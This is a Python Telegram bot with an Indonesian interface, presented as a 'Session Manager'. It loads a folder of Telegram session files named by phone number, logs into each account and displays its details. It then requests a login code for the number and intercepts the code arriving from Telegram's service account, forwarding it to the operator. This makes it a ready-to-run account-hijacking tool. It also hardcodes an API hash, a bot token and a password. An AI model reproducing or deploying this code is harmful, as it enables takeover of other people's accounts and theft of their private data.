from telethon import TelegramClient, events
from telethon.tl.custom import Button
import os
from telethon.errors import SessionPasswordNeededError
from telethon.tl.functions.users import GetFullUserRequest
import asyncio
import math
import re

# API Configuration
API_ID = '20115110'
API_HASH = '192c9900730edbd7e03fe772e3f8810d'
BOT_TOKEN = '7811834226:AAEz5s-cNCFFVWqE2EoaHRZpLzfVKCss4es'
SESSION_PASSWORD = "Soleplayer0p3$"
ALLOWED_USER_ID = 7581225841

# Constants
SESSION_FOLDER = "Session/"
FILES_PER_PAGE = 2
verified_users = {}
user_states = {}

def is_user_allowed(event):
    return event.sender_id == ALLOWED_USER_ID

# Initialize client
bot = TelegramClient('bot_session', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

async def create_navigation_buttons(page, total_pages):
    """Create navigation buttons with page information"""
    buttons = []
    nav_row = []
    
    if page > 0:
        nav_row.append(Button.inline("◀️", f"page_{page-1}"))
    
    nav_row.append(Button.inline(f"📄 {page + 1}/{total_pages}", "current_page"))
    
    if page < total_pages - 1:
        nav_row.append(Button.inline("▶️", f"page_{page+1}"))
    
    buttons.append(nav_row)
    buttons.append([
        Button.inline("🔄 Refresh", "refresh"),
        Button.inline("📱 Menu", "main_menu")
    ])
    
    return buttons

@bot.on(events.NewMessage(pattern='/start'))
async def start_command(event):
    if not is_user_allowed(event):
        await event.respond("⚠️ Anda tidak diizinkan menggunakan bot ini.")
        return
    """Handler for /start command with interactive buttons"""
    buttons = [
        [Button.inline("📱 Menu Utama", "show_menu")],
        [Button.inline("ℹ️ Bantuan", "show_help")]
    ]
    
    welcome_message = """
*🤖 Selamat datang di Session Manager!*

Silakan pilih menu di bawah ini untuk memulai.
Bot ini akan membantu Anda mengelola session dengan mudah.

_Tips: Gunakan tombol Menu Utama untuk melihat semua fitur yang tersedia._
    """
    await event.respond(welcome_message, buttons=buttons, parse_mode='markdown')

@bot.on(events.CallbackQuery(pattern="show_menu"))
async def callback_menu(event):
    """Handler for menu button callback"""
    buttons = [
        [Button.inline("📁 Lihat Session", "view_sessions")],
        [Button.inline("⬅️ Kembali", "back_to_start")]
    ]
    
    menu_message = """
*📱 Menu Utama*

Silakan pilih opsi yang tersedia:
• 📁 Lihat Session - Melihat daftar session yang tersedia
• ⬅️ Kembali - Kembali ke menu awal

_Tips: Pastikan Anda memiliki password untuk mengakses session._
    """
    await event.edit(menu_message, buttons=buttons, parse_mode='markdown')

@bot.on(events.CallbackQuery(pattern="show_help"))
async def callback_help(event):
    """Handler for help button"""
    buttons = [[Button.inline("⬅️ Kembali", "back_to_start")]]
    
    help_message = """
*ℹ️ Bantuan Penggunaan Bot*

1️⃣ *Cara Mengakses Session:*
   • Klik Menu Utama
   • Pilih 'Lihat Session'
   • Masukkan password ketika diminta

2️⃣ *Navigasi Session:*
   • Gunakan tombol ◀️ ▶️ untuk berpindah halaman
   • Klik 🔄 untuk memperbarui daftar
   • Klik 📱 untuk kembali ke menu

3️⃣ *Tips Keamanan:*
   • Jangan bagikan password Anda
   • Selalu logout setelah selesai
   • Perbarui password secara berkala

_Untuk bantuan lebih lanjut, silakan hubungi admin._
    """
    await event.edit(help_message, buttons=buttons, parse_mode='markdown')

def get_files_with_pagination(page):
    """Get session files with pagination"""
    files = [f for f in os.listdir(SESSION_FOLDER) if f.endswith('.session')]
    total_pages = max(1, math.ceil(len(files) / FILES_PER_PAGE))
    start = page * FILES_PER_PAGE
    end = start + FILES_PER_PAGE
    return files[start:end], total_pages

async def show_sessions_page(event, page=0):
    """Display session files with navigation buttons"""
    files, total_pages = get_files_with_pagination(page)
    
    if not files:
        message = """
*📂 Tidak ada session yang tersedia*

Silakan hubungi admin untuk informasi lebih lanjut.
        """
        buttons = [[Button.inline("⬅️ Kembali ke Menu", "show_menu")]]
        await event.edit(message, buttons=buttons, parse_mode='markdown')
        return
    
    message = "*📱 Daftar Session Tersedia:*\n\n"
    for i, file in enumerate(files, 1):
        phone_number = file.replace('.session', '')
        formatted_number = f"+{phone_number}"
        message += f"📱 `{formatted_number}`\n"
    
    message += "\n_Gunakan tombol navigasi untuk melihat session lainnya._"
    
    buttons = await create_navigation_buttons(page, total_pages)
    await event.edit(message, buttons=buttons, parse_mode='markdown')

@bot.on(events.CallbackQuery(pattern=r"page_(\d+)"))
async def callback_pagination(event):
    """Handler for pagination button callbacks"""
    page = int(event.data_match.group(1))
    await show_sessions_page(event, page)

@bot.on(events.CallbackQuery(pattern="view_sessions"))
async def callback_view_sessions(event):
    """Handler for view sessions button"""
    user_id = event.sender_id
    
    if user_id not in verified_users or not verified_users[user_id]:
        buttons = [[Button.inline("🔐 Masukkan Password", "enter_password")]]
        await event.edit("""
*🔒 Verifikasi Diperlukan*

Silakan masukkan password untuk mengakses daftar session.
_Tips: Password bisa didapatkan dari admin._
        """, buttons=buttons, parse_mode='markdown')
        return
    
    await show_sessions_page(event)

@bot.on(events.CallbackQuery(pattern="back_to_start"))
async def callback_back_to_start(event):
    """Handler for back to start button"""
    buttons = [
        [Button.inline("📱 Menu Utama", "show_menu")],
        [Button.inline("ℹ️ Bantuan", "show_help")]
    ]
    
    message = """
*🤖 Session Manager*

Silakan pilih menu di bawah ini untuk memulai.
Bot ini akan membantu Anda mengelola session dengan mudah.

_Tips: Gunakan tombol Menu Utama untuk melihat semua fitur yang tersedia._
    """
    await event.edit(message, buttons=buttons, parse_mode='markdown')

@bot.on(events.CallbackQuery(pattern="refresh"))
async def callback_refresh(event):
    """Handler for refresh button"""
    page = user_states.get(event.sender_id, {}).get("page", 0)
    await show_sessions_page(event, page)

@bot.on(events.CallbackQuery(pattern="main_menu"))
async def callback_main_menu(event):
    """Handler for main menu button"""
    await callback_menu(event)

@bot.on(events.CallbackQuery(pattern="enter_password"))
async def callback_enter_password(event):
    """Handler for enter password button"""
    await event.edit("""
*🔐 Masukkan Password*

Reply pesan ini dengan password yang valid.
_Tips: Hubungi admin jika Anda lupa password._
    """, parse_mode='markdown')

@bot.on(events.NewMessage)
async def handle_password(event):
    """Handler for password verification"""
    if event.message.text == SESSION_PASSWORD:
        user_id = event.sender_id
        verified_users[user_id] = True
        buttons = [[Button.inline("📁 Lihat Session", "view_sessions")]]
        await event.respond("""
*✅ Verifikasi Berhasil!*

Anda sekarang dapat mengakses daftar session.
Silakan klik tombol di bawah untuk melanjutkan.
        """, buttons=buttons, parse_mode='markdown')
    elif event.message.text.startswith('/'):
        return
    elif event.sender_id in verified_users and not verified_users[event.sender_id]:
        buttons = [[Button.inline("🔄 Coba Lagi", "enter_password")]]
        await event.respond("""
*❌ Password Salah*

Silakan coba lagi atau hubungi admin untuk bantuan.
        """, buttons=buttons, parse_mode='markdown')

# Regular expression pattern for OTP request
OTP_PATTERN = r'^(\+?\d+)\s+otp$'

@bot.on(events.NewMessage(pattern=OTP_PATTERN))
async def handle_otp_request(event):
    """Handler for OTP requests in format: +number otp"""
    if event.sender_id not in verified_users or not verified_users[event.sender_id]:
        buttons = [[Button.inline("🔐 Verifikasi Dulu", "enter_password")]]
        await event.respond("""
*🔒 Verifikasi Diperlukan*

Anda harus verifikasi password terlebih dahulu untuk mengakses fitur ini.
        """, buttons=buttons, parse_mode='markdown')
        return

    # Extract phone number from message
    phone_number = re.match(OTP_PATTERN, event.text).group(1)
    session_file = f"{phone_number.lstrip('+')}.session"
    session_path = os.path.join(SESSION_FOLDER, session_file)

    if not os.path.exists(session_path):
        await event.respond("""
*❌ Session Tidak Ditemukan*

Session untuk nomor tersebut tidak tersedia.
Silakan periksa kembali nomor yang Anda masukkan.
        """, parse_mode='markdown')
        return

    # Send initial loading message
    loading_msg = await event.respond("*🔄 Sedang mengambil informasi...*", parse_mode='markdown')

    try:
        # Create new client instance for the session
        client = TelegramClient(session_path, API_ID, API_HASH)
        await client.connect()

        if not await client.is_user_authorized():
            await loading_msg.edit("""
*❌ Session Tidak Valid*

Session ini sudah tidak aktif atau terlogout.
Silakan hubungi admin untuk informasi lebih lanjut.
            """, parse_mode='markdown')
            await client.disconnect()
            return

        # Get account information
        me = await client.get_me()
        full_user = await client(GetFullUserRequest(me.id))

        # Format user information
        info_message = f"""
*📱 Informasi Akun Telegram*

👤 *Detail Utama:*
• ID: `{me.id}`
• Phone: `{me.phone}`
• First Name: `{me.first_name or '-'}`
• Last Name: `{me.last_name or '-'}`
• Username: `{'@' + me.username if me.username else '-'}`
• Premium: {'✅' if me.premium else '❌'}
• Verified: {'✅' if me.verified else '❌'}

📊 *Status:*
• Dapat Dihubungi: {'✅' if me.contact else '❌'}
• Terakhir Online: `{me.status.__class__.__name__}`
• Mutual Contact: {'✅' if me.mutual_contact else '❌'}

💡 *Info Tambahan:*
• Bot: {'✅' if me.bot else '❌'}
• Scam: {'⚠️ Ya' if me.scam else '✅ Tidak'}
• Restricted: {'⚠️ Ya' if me.restricted else '✅ Tidak'}
• Fake: {'⚠️ Ya' if me.fake else '✅ Tidak'}
"""

        # Add bio if available
        if full_user.full_user.about:
            info_message += f"\n📝 *Bio:*\n`{full_user.full_user.about}`"

        # Add profile photo count if available
        if hasattr(full_user.full_user, 'profile_photo_count'):
            info_message += f"\n🖼 *Jumlah Foto Profil:* `{full_user.full_user.profile_photo_count}`"

        # Create navigation buttons with the new "Get my otp" button
        buttons = [
            [Button.inline("🔐 Get my otp", f"get_otp_{phone_number}")],
            [Button.inline("🔄 Refresh Info", f"refresh_info_{phone_number}")],
            [Button.inline("📱 Menu Utama", "main_menu")]
        ]

        # Edit the loading message with the complete information
        await loading_msg.edit(info_message, buttons=buttons, parse_mode='markdown')
        
        # Disconnect the client
        await client.disconnect()

    except Exception as e:
        error_message = f"""
*❌ Terjadi Kesalahan*

Tidak dapat mengambil informasi akun.
Error: `{str(e)}`

_Silakan coba lagi nanti atau hubungi admin._
        """
        await loading_msg.edit(error_message, parse_mode='markdown')
        if 'client' in locals():
            await client.disconnect()

@bot.on(events.CallbackQuery(pattern=r"refresh_info_(\+?\d+)"))
async def callback_refresh_info(event):
    """Handler for refreshing account information"""
    phone_number = event.data_match.group(1).decode()
    # Simulate new message event
    new_event = events.NewMessage.Event({
        "message": phone_number + " otp",
        "peer_id": event.peer_id,
        "from_id": event.sender_id
    })
    new_event.sender_id = event.sender_id
    await handle_otp_request(new_event)

@bot.on(events.CallbackQuery(pattern=r"get_otp_(\+?\d+)"))
async def callback_get_otp(event):
    """Handler for Get OTP button"""
    phone = event.data_match.group(1).decode()
    dummy = "mydummysession"
    api_id = 20115110
    api_hash = '192c9900730edbd7e03fe772e3f8810d'
    target = 777000

    await event.answer("Memproses permintaan OTP...")

    # Inisialisasi 'babi' untuk request OTP
    babi = TelegramClient(dummy, api_id, api_hash)
    # Inisialisasi 'client' untuk mendengarkan pesan OTP
    client_session_path = os.path.join(SESSION_FOLDER, f"{phone.lstrip('+')}.session")
    client = TelegramClient(client_session_path, api_id, api_hash)

    # Event untuk menghentikan loop
    exit_event = asyncio.Event()

    # Fungsi handler untuk menangani pesan OTP
    @client.on(events.NewMessage(from_users=target))
    async def handler(otp_event):
        pesan = otp_event.message.text
        angka = re.search(r'\d+', pesan)  # Mencari angka dalam pesan
        if angka:
            otp = angka.group()
            print(f"OTP yang diterima: {otp}")
            # Kirim OTP ke user
            await bot.send_message(event.sender_id, f"Kode OTP Anda: {otp}")
        else:
            print("Tidak ada angka dalam pesan")
            await bot.send_message(event.sender_id, "Tidak ada angka dalam pesan yang diterima.")

    # Command handler untuk keluar dari mode listen
    @bot.on(events.NewMessage(pattern=r"/exit"))
    async def exit_handler(exit_event_obj):
        if exit_event_obj.sender_id == event.sender_id:
            await exit_event_obj.reply("Listener dihentikan.")
            exit_event.set()

    try:
        await client.connect()

        if not await client.is_user_authorized():
            await event.respond(f"Session tidak valid untuk {phone}")
            await client.disconnect()
            return

        # Kirimkan permintaan OTP
        await babi.connect()
        await babi.send_code_request(phone)
        await event.respond(f"OTP telah dikirim ke {phone}. Ketik /exit untuk keluar dari mode listen.")

        # Tunggu hingga user mengirim /exit
        await exit_event.wait()

    except Exception as e:
        await event.respond(f"Terjadi kesalahan: {str(e)}")

    finally:
        # Pastikan untuk disconnect client dan babi setelah proses selesai
        if 'client' in locals() and client.is_connected():
            await client.disconnect()
        if 'babi' in locals() and babi.is_connected():
            await babi.disconnect()


@bot.on(events.NewMessage(pattern='/exit'))
async def exit_command(event):
    """Handler for /exit command to release session file"""
    user_id = event.sender_id
    if user_id not in verified_users or not verified_users[user_id]:
        await event.respond("""
*❌ Anda belum terverifikasi*

Silakan verifikasi terlebih dahulu sebelum menggunakan perintah ini.
        """, parse_mode='markdown')
        return

    # Remove user verification state
    verified_users.pop(user_id, None)
    user_states.pop(user_id, None)

    await event.respond("""
*✅ Anda telah keluar dari sesi aktif.*

Semua sesi telah dilepas, dan Anda harus login kembali untuk mengakses bot.
    """, parse_mode='markdown')



def main():
    """Main function to run the bot"""
    print("🤖 Bot telah aktif!")
    print("✨ Interface siap digunakan")
    bot.run_until_disconnected()

if __name__ == '__main__':
    main()